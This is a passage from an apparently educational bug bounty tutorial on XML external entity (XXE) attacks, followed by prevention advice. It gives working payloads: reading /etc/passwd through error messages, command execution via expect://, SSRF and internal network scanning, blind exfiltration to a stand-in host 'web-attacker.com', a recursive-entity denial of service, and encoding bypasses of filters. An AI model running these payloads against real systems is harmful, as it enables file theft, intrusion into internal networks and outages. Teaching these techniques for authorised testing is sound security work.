class="code"><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;
+%eval;
+%error;</code></pre><p id="ed57d5eb-3978-495b-90d6-2140c705fd03" class="">In this example we have nested our file in an error message which might result in the contents of the /etc/passwd file being dumped anyway. </p><pre id="c9b3d994-f79e-4d7b-b3a1-e34e47eb032d" class="code"><code>java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...</code></pre><p id="0bdced92-5458-4d1e-8938-955bbb1edb9f" class="">Make sure that you try to grab windows files from a windows file structure if your target uses windows and don&#x27;t just blindly assume your target uses linux, actually try to check this. </p><h2 id="e0cb2ff6-90fd-488c-9d45-d42668190011" class="">Executing commands</h2><p id="ea086022-5c48-4a40-8591-61a3f4f078e2" class="">We can also try executing commands that are native to our host system such as ls for linux or dir for windows. It is always important that we tune our attacks to our host system and if you are attacking a windows system and your XXE attack does not seem to fully work but only partially this might be because you are using linux commands on a windows system. This happened way to often for me, i don&#x27;t even want to admit it to be honest because i feel dumb if i tell you...</p><p id="63978082-18fd-47e6-8ced-c88d501e48a4" class="">For example a simple ls command</p><pre id="15e841b2-1bec-4b87-b663-d197fc4ec910" class="code"><code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;
+    &lt;image xlink:href=&quot;expect://ls&quot;&gt;&lt;/image&gt;
+&lt;/svg&gt;</code></pre><h2 id="8da67d4d-f952-484e-8ab7-cd1bcdba57b0" class="">Executing SSRF via XXE</h2><p id="f1aabc34-2ebd-4f4d-93a9-69b7375dcff2" class="">This is an example a lot of people will know because we can often use XXE to execute SSRF attacks. In the same fashion that we would test for blind XXE (Making an HTTP request to our own sever) we can also try to execute SSRF attacks via XXE. </p><p id="c147a7ce-4841-47c5-8a9d-865a480ae1d0" class="">To explain this attack type we need to talk a little bit about SSRF as we do need to know what it is. Let&#x27;s talk about an example to make this more clear. </p><p id="f2683d6d-ed12-42e2-bd1f-81808e954ae5" class="">We have a webshop that has an admin panel, but the general OWASP security guidelines desribe that administrative panels should not be accesible from outside of the organisations network. This means an attacker would have to be inside the network of the target to be able to even start attacking the admin panel... or does it? Because with Server Side Request Forgery(SSRF) we can fool the webserver into making a request to the admin panel for us! This can be really handy because the admin panel will see that the webserver is making a call to it which is in the internal network and thus allowed. If the admin was arrogant enough to think nothing could hack him and if he used a weak password like test/test or admin/admin or maybe even worse, if he did not set a password at all, the attacker will be able to control the website. </p><p id="5d7a035a-4251-42d0-8a13-301a22cec562" class="">This is just one example and i talk about SSRF in depth in my course <a href="https://www.udemy.com/course/uncle-rats-bug-bounty-guide/?referralCode=0BD24C39EF0F2412ECB4">https://www.udemy.com/course/uncle-rats-bug-bounty-guide/?referralCode=0BD24C39EF0F2412ECB4</a></p><p id="28e9582e-9ad6-4f11-acfa-9de8d0f0d0ef" class="">XXE can be used for this by simply making a request to that internal server</p><pre id="d281d8f2-21a8-44a4-8654-e6470eef7df1" class="code"><code>Content-Type: application/xml;charset=UTF-8
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;
+&lt;!DOCTYPE testingxxe [&lt;!ENTITY xxe SYSTEM &quot;http://34.229.92.127:8000/admin.php&quot; &gt;]&gt; 
+&lt;root&gt;
+ &lt;root&gt;
+  &lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;
+  &lt;lastName/&gt;
+  &lt;country&gt;United States&lt;/country&gt;
+  &lt;city&gt;ddd&lt;/city&gt;
+  &lt;postalCode&gt;ddd&lt;/postalCode&gt;
+ &lt;/root&gt;
+&lt;/root&gt;</code></pre><p id="db81e6aa-ee8c-4a64-95b7-163ff2627b01" class="">The biggest drawback is that it is really hard to get to know the internal network but if we know the internal ip adress of the webserver we can do a sort of &quot;network scan&quot; by firing requests in rapid succession and seeing which resolve and which fail.</p><pre id="ea31fc47-a9ad-4c83-8798-73ad3bd79834" class="code"><code>Content-Type: application/xml;charset=UTF-8
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;
+&lt;!DOCTYPE testingxxe [&lt;!ENTITY xxe SYSTEM &quot;http://34.229.92.127&quot; &gt;]&gt; 
+&lt;root&gt;
+ &lt;root&gt;
+  &lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;
+  &lt;lastName/&gt;
+  &lt;country&gt;United States&lt;/country&gt;
+  &lt;city&gt;ddd&lt;/city&gt;
+  &lt;postalCode&gt;ddd&lt;/postalCode&gt;
+ &lt;/root&gt;
+&lt;/root&gt;
+
+Content-Type: application/xml;charset=UTF-8
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;
+&lt;!DOCTYPE testingxxe [&lt;!ENTITY xxe SYSTEM &quot;http://34.229.92.126&quot; &gt;]&gt; 
+&lt;root&gt;
+ &lt;root&gt;
+  &lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;
+  &lt;lastName/&gt;
+  &lt;country&gt;United States&lt;/country&gt;
+  &lt;city&gt;ddd&lt;/city&gt;
+  &lt;postalCode&gt;ddd&lt;/postalCode&gt;
+ &lt;/root&gt;
+&lt;/root&gt;
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;
+&lt;!DOCTYPE testingxxe [&lt;!ENTITY xxe SYSTEM &quot;http://34.229.92.125&quot; &gt;]&gt; 
+&lt;root&gt;
+ &lt;root&gt;
+  &lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;
+  &lt;lastName/&gt;
+  &lt;country&gt;United States&lt;/country&gt;
+  &lt;city&gt;ddd&lt;/city&gt;
+  &lt;postalCode&gt;ddd&lt;/postalCode&gt;
+ &lt;/root&gt;
+&lt;/root&gt;</code></pre><p id="e065b799-52ae-4f8d-844c-a72b84a99fe0" class="">We can do this with burp suite intruder. We can ofcourse do exactly the same for directories making a small directory brute forcer for the IPs that we know resolve from the previous step. As with all automation you have to be very very careful as to not accidentally bring down your target. I recommend running this at 1 request per second at the very max. </p><h2 id="ad8e98be-1584-4fa3-8bb3-d2b3ff2bef04" class="">Exploiting blind XXE</h2><p id="fd632d11-6b07-499e-8748-aec60684cffa" class="">If we find blind XXE it&#x27;s going to be a lot harder to test for systems that are on the internal network by sending them an HTTP request. After all, since we can not see the response we will never know which IPs resolve. It seems like this is game over for us but again looks can be deceiving. We can still exfiltrate data if we make a request to our server and include the file as a GET parameter. </p><pre id="1663e2e4-91b5-48e8-8e00-18d6a4515c12" class="code"><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://web-attacker.com/?x=%file;&#x27;&gt;&quot;&gt;
+%eval;
+%exfiltrate;</code></pre><h2 id="fcfa60a0-c0e2-4a34-9cd7-443a2ccffd70" class="">Executing a DoS attack</h2><p id="1b7605dd-cc1c-4876-948f-9886e9473062" class="">Using XXE attacks, we can also cause an application level DoS (NOT DDoS!!) by spamming entities and declaring them recursively. The XML parser was not meant to deal with this much external entities and will be busy for a long time, preventing any normal user from getting their XML requests processed. This is especially true if these requests are sent in very large volumes. <span style="border-bottom:0.05em solid"><strong>Never test this if your target our client is not informed as this could bring down their environment. Especially never test this on a production  environment!</strong></span></p><pre id="ab322e98-60c7-4d99-a872-00c0468c832d" class="code"><code>&lt;!DOCTYPE data [
+&lt;!ENTITY a0 &quot;dos&quot; &gt;
+&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
+&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
+&lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;
+&lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;
+]&gt;
+&lt;data&gt;&amp;a4;&lt;/data&gt;</code></pre><h1 id="ba98adf0-9517-4f12-beee-b83b33beb8ba" class="">Bypasses</h1><p id="4cf394ab-41ab-48df-9dbc-dd165ed44fb7" class="">Sometimes our original XXE is filtered and we might need to bypass these filters. There are several techniques we can employ for this but we will go over 2 in this document and i encourage you to think of your own inspired by these. </p><h2 id="ea40b4a9-cab3-4127-8c4a-d91d02c4dd81" class="">BASE64</h2><pre id="41f70558-a220-4048-8ebc-b03ca229949a" class="code"><code>
+&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&quot;&gt; %init; ]&gt;&lt;foo/&gt;</code></pre><p id="8af83e6d-13bb-4681-b49a-627da308952f" class="">In this case, the attack is encoded in base64 which will prevent some filter from picking out this request as malicious but ofcourse you all know base64 is not the only encoding type so you can play around a little bit with the encodings as well to fool even more filters. Most developers know about the base64 trick by now but there are other tricks. Figure them out by using a different encoding for example. </p><p id="1979b5bd-94fb-4f0a-a5ae-937ae2dfacd3" class="">You should always figure out things that are not talked about much yet and abuse them frequently if you can. It will increase your chances of finding a bug since developers will often look at those frequently occurring bugs and try to combat them. </p><h2 id="9595d211-14fe-4cfd-872b-ec91d8f2bbb4" class="">UTF-7</h2><p id="4b40d78c-5d5b-438d-84aa-c6b519641564" class="">An example of this would be UTF-7. This is a different encoding type that can still work:</p><pre id="e08b31d9-3567-4f71-a381-6780175f0c00" class="code"><code>&lt;!xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?--&gt;
++ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-</code></pre><h1 id="c9946f18-5581-4312-ae5a-1e268c0622ef" class="">XXE Tools</h1><p id="894d2887-1fbf-48b5-b8d5-2042e67cd963" class="">Ofcourse there are also some tools we can use to help us exploit XXE attacks better for example. </p><ul id="ceda9e41-c1cc-4468-8e9f-71d7a87f8262" class="bulleted-list"><li><a href="https://kalilinuxtutorials.com/xxexploiter/">https://kalilinuxtutorials.com/xxexploiter/</a></li></ul><ul id="af117a55-4290-4a18-b8f4-9ac042707cc8" class="bulleted-list"><li><a href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></li></ul><p id="ea56f45d-794e-4089-abeb-c59ec292909b" class="">You will notice this list is a lot smaller than for some other vulnerabilities and that&#x27;s because it&#x27;s very hard to check for XXE properly. It is very situational so manual testing is usually the best way to find for bug bounty hunters. Another useful item i have to share is a document with XXE payloads. </p><ul id="cd112ae9-ab95-47f6-b5fb-b77e8b77e768" class="bulleted-list"><li><a href="https://gist.github.com/staaldraad/01415b990939494879b4">https://gist.github.com/staaldraad/01415b990939494879b4</a></li></ul><ul id="c3b635ff-3c59-4b07-a034-5e7e5ca6741c" class="bulleted-list"><li><a href="https://ismailtasdelen.medium.com/xml-external-entity-xxe-injection-payload-list-937d33e5e116">https://ismailtasdelen.medium.com/xml-external-entity-xxe-injection-payload-list-937d33e5e116</a></li></ul><h1 id="c8bbbcc1-6396-42c2-a174-269f34207612" class="">Preventing XXE</h1><p id="a2fbab70-e3b2-424d-b7be-911bbb67b43c" class="">Preventing XXE is not an easy task which is why certain tooling can help us in this endeavour. </p><h2 id="739e1611-aedc-4225-ac39-d5f3d5591e28" class="">Static analysis tools</h2><p id="a7994818-3ad2-4471-a11d-0d79f7d104b9" class="">Static code analysis tools can help you find possible XXE attack entry points by checking dependencies and configurations for any possible XXE issues. These tools will basically check your code and configurations for patterns that resemble XXE injection points and will report them back to you. This enables us to test for XXE without even executing the code. </p><p id="ef9fc862-fdc1-4566-b718-72b312bcf2b2" class="">A comprehensive list of those tools can be found here: <a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">https://owasp.org/www-community/Source_Code_Analysis_Tools</a></p><h2 id="e791d3c5-394e-4f9d-ab7a-e8bf5784a5b0" class="">Dynamic analysis tools</h2><p id="b2d2a010-475c-4a68-9d7c-2bb6b364dcd9" class="">Dynamic code analysis tools will often run the code to an extend or fully and analyse the resulting behaviour by feeding the code XXE attack vectors for example but it will require some additional checks and setups as they do not usually check for XXE by default as of 2017. </p><p id="beff3c55-303b-4cdb-9444-ad1c8b91302c" class="">A comprehensive list of these tools can be found here: <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">https://owasp.org/www-community/Vulnerability_Scanning_Tools</a></p><h2 id="e129d505-667c-44db-bc4e-fee45956b7dd" class="">Manual testing</h2><p id="a70f32e4-5b06-491d-b9a4-b75d82f7903d" class="">It is very important that manual testers are properly trained to look for XXE entry points, even if they are not that technical. A technical tester can still provide them with XXE files or examples that the tester can use. It is important that we test every single entry point and the moment a tester sees something that resembles an XML file, they should trigger a small alarm bell in their head warning them for potential XXE. </p><h2 id="9c7505f5-5a56-4a6e-a110-2f3df7f85efa" class="">Risk Factors</h2><ul id="c2e2e225-5d7a-4845-9b9d-f6836e8a56a8" class="bulleted-list"><li>If the target processes XML files</li></ul><ul id="c1c5aaf0-a917-443b-85e8-97c9bd2f6d42" class="bulleted-list"><li>If the target allows tainted data in the DTD section of the XML file</li></ul><ul id="6b6aabf6-9ef2-4fd8-9884-0a196850a3bf" class="bulleted-list"><li>If the processor is not made to validate the XML with an XSD file</li></ul><ul id="8270a5ac-1585-49c2-9dfb-8cf7005b9622" class="bulleted-list"><li>If the processor is configured to resolve external entities within the XML file&#x27;s DTD</li></ul><p id="786981bf-fed6-4a9b-aa39-5494ea130701" class="">If all of these risk factors have been ignored and crossed, we are simply begging for an XXE attack. </p><h2 id="de2e3388-f7a1-479a-a624-b27285a86258" class="">General tips and tricks</h2><ul id="e44c5119-60e7-49c4-b775-feae39d6249e" class="bulleted-list"><li>If possible you should avoid using XML files for other formats such as JSON</li></ul><ul id="272d1a6f-d17d-4a80-b21f-16220b0dcad9" class="bulleted-list"><li>If possible you should not allow the user to upload SVG files. The risk is too high and normally users don&#x27;t use SVG files. Those who do will probably know how to convert them as well. </li></ul><ul id="1781b831-7afb-4444-910e-7c3e290418d8" class="bulleted-list"><li>Make sure that whenever you do use an XML processor library that you patch it fully and keep it patched fully </li></ul><ul id="4cf7e7d1-64f8-4edf-b8d8-7130161b8a3e" class="bulleted-list"><li>On that same note, make sure you use SOAP 1.2 or higher</li></ul><ul id="d8f2a781-abc1-4721-9b47-cde0ebcda8cc" class="bulleted-list"><li>If you use XML, disable external entities and DTD processing. </li></ul><ul id="5d10a8cf-ec1c-43b9-ab68-ce8da88534ed" class="bulleted-list"><li>If the user can upload an XML file (Which you should avoid), make sure the structure of the file is checked against an XSD file before it is sent off the XML processor. </li></ul><ul id="389c6609-dbd9-4735-aef4-f1269fca8454" class="bulleted-list"><li>Use Static Code Analysis tools, they will pick up stuff testers miss</li></ul><ul id="0ddf09db-6330-4998-aab2-0481182db739" class="bulleted-list"><li>Invest enough money in testing and the quality of the product</li></ul><ul id="4f15e477-92d1-4295-8613-a3fc9ae2d602" class="bulleted-list"><li>The safest way to prevent XXE is always to disable DTDs (External Entities) completely. Depending on the parser</li></ul><p id="e5da642c-3364-4dac-9232-ced18f18e57d" class="">
+</p></div></article><a href="https://hide01.ir"><span class="icon">🎩</span>Hide01</a></body></html>
